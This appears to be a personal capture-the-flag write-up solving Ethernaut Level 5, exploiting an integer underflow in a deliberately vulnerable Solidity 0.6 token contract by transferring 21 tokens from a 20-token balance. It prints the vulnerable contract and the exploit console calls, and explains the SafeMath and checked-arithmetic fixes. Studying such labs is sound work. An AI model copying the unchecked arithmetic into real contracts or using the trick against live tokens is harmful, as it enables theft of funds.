# Ethernaut Level 5 — Token

## Introduction

**Token** is Level 5 of OpenZeppelin's Ethernaut Web3 CTF.

The goal of this level is to get more tokens than the 20 tokens I start with.

When I first looked at the contract, it was pretty simple. The main thing I had to learn for this level was **integer overflow and underflow**.

The contract is using an older Solidity version:

```solidity
pragma solidity ^0.6.0;
```

In older versions like this, arithmetic could wrap around instead of reverting when it went outside the range of a `uint256`.

Once I understood that, the solution was basically to make my token balance underflow.

---

## Objective

The challenge says that I start with **20 tokens** and need to get any additional tokens.

The contract is:

```solidity
contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

---

## 1. Going Through the Contract

I first went through the contract to understand how the balances were stored and how tokens were transferred.

### `balances`

```solidity
mapping(address => uint256) balances;
```

This mapping keeps track of how many tokens each address has.

### `totalSupply`

```solidity
uint256 public totalSupply;
```

This stores the total number of tokens in the contract.

### `constructor()`

```solidity
constructor(uint256 _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
}
```

When the contract is deployed, the initial supply is assigned to the deployer.

For this level, I start with:

```text
20 tokens
```

### `balanceOf()`

```solidity
function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
}
```

This just returns the token balance of the address I provide.

---

## 2. Looking at `transfer()`

The function that I was mainly interested in was:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

At first, this looks like it is checking whether I have enough tokens:

```solidity
require(balances[msg.sender] - _value >= 0);
```

Normally, if I have 20 tokens and try to transfer 21, I would expect:

```text
20 - 21 = -1
```

and the transaction should fail.

But there is a problem with that assumption.

`balances[msg.sender]` is a `uint256`.

---

## 3. Understanding Underflow

A `uint256` can only store values from:

```text
0
```

to:

```text
2^256 - 1
```

It cannot store negative numbers.

So if I have:

```text
20
```

and subtract:

```text
21
```

the normal mathematical result is:

```text
-1
```

But `uint256` cannot store `-1`.

In older Solidity versions, instead of reverting, the value wraps around to the maximum possible `uint256` value:

```text
2^256 - 1
```

This is called **integer underflow**.

So:

```text
20 - 21
   ↓
underflow
   ↓
2^256 - 1
```

This gives an extremely large number.

---

## 4. Why the `require()` Doesn't Stop It

This was the important part of the level.

The contract checks:

```solidity
require(balances[msg.sender] - _value >= 0);
```

I initially expected this to stop me from transferring more tokens than I owned.

But the subtraction happens before the comparison.

If my balance is 20 and `_value` is 21:

```text
20 - 21
```

underflows and becomes:

```text
2^256 - 1
```

So the actual check is basically:

```text
2^256 - 1 >= 0
```

which is true.

Therefore, the `require()` passes.

The contract then performs the subtraction again:

```solidity
balances[msg.sender] -= _value;
```

and my balance becomes the huge wrapped-around value.

---

## 5. Checking My Initial Balance

Before exploiting the bug, I checked my token balance:

```javascript
await contract.balanceOf('0xc1B76725E3271E6E522360Dfef6b45F00262d8b9')
```

This showed that I had:

```text
20 tokens
```

So I knew I had to make the subtraction go below zero.

---

## 6. Executing the Exploit

Once I understood the underflow, I just needed to transfer more tokens than I had.

I used:

```javascript
await contract.transfer("0xE44cFB653b610Bf2af47D9D25fD60C2f35adD816",21)
```

I had 20 tokens but tried to transfer 21.

So the important calculation was:

```text
20 - 21
   ↓
underflow
   ↓
2^256 - 1
```

Because of the underflow, my balance wrapped around to a very large `uint256` value.

The transfer also sent the 21 tokens to the address I provided.

---

## 7. Checking the New Balance

After the transaction went through, I checked my balance again:

```javascript
await contract.balanceOf('0xc1B76725E3271E6E522360Dfef6b45F00262d8b9')
```

My balance was no longer 20.

It had become a huge `uint256` value because of the underflow.

The maximum value of a `uint256` is:

```text
2^256 - 1
```

which is:

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

So I had successfully gone from 20 tokens to an extremely large number of tokens.

---

## 8. Overflow vs Underflow

While learning this level, I also looked at the difference between overflow and underflow.

### Underflow

Underflow happens when a value goes below the minimum value.

For example:

```text
0 - 1
```

For an unsigned integer, this wraps around to:

```text
2^256 - 1
```

This is the bug I used in this level.

### Overflow

Overflow is the opposite.

It happens when a value goes above the maximum value.

For a `uint256`:

```text
2^256 - 1 + 1
```

would wrap around to:

```text
0
```

So both bugs are basically caused by values going outside the range that the integer type can store.

---

## 9. Why the Solidity Version Matters

The contract uses:

```solidity
pragma solidity ^0.6.0;
```

In older Solidity versions, arithmetic operations like this did not automatically revert when they overflowed or underflowed.

This is why the exploit worked.

In newer Solidity versions, arithmetic is checked by default, so an overflow or underflow normally causes the transaction to revert.

Before checked arithmetic became the default, developers commonly used libraries such as **SafeMath** to handle these checks.

---

## 10. Completing the Level

The solution for this level was pretty straightforward once I understood underflow.

I started with:

```text
20 tokens
```

I checked my balance using:

```javascript
await contract.balanceOf('0xc1B76725E3271E6E522360Dfef6b45F00262d8b9')
```

Then I noticed that `transfer()` was doing:

```solidity
balances[msg.sender] - _value
```

and the contract was using an older Solidity version.

So I tried transferring:

```text
21 tokens
```

even though I only had 20:

```javascript
await contract.transfer("0xE44cFB653b610Bf2af47D9D25fD60C2f35adD816",21)
```

The subtraction underflowed and my balance wrapped around to a huge `uint256` value.

I checked the balance again and confirmed that I had far more than the original 20 tokens.

After that, I submitted the level instance in Ethernaut.

---

## Level 5 — Completed ✅
